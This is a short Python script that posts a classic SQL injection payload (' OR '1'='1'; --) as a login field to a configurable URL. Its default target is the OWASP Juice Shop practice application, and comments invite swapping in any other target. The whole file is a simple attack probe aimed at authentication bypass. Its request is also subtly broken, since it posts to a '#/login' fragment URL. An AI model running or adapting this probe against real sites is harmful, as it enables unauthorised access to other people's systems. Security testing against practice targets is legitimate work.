# sqli_test.py
import requests

def test_sqli(url, param):
    payload = "' OR '1'='1'; --"
    data = {param: payload}
    response = requests.post(url, data=data)
    return response

if __name__ == "__main__":
    url = "https://juice-shop.herokuapp.com/#/login"  # Replace with your target URL
    param = "username"  # Replace with the parameter to test
    response = test_sqli(url, param)
    print("SQL Injection Test Response:", response.text)
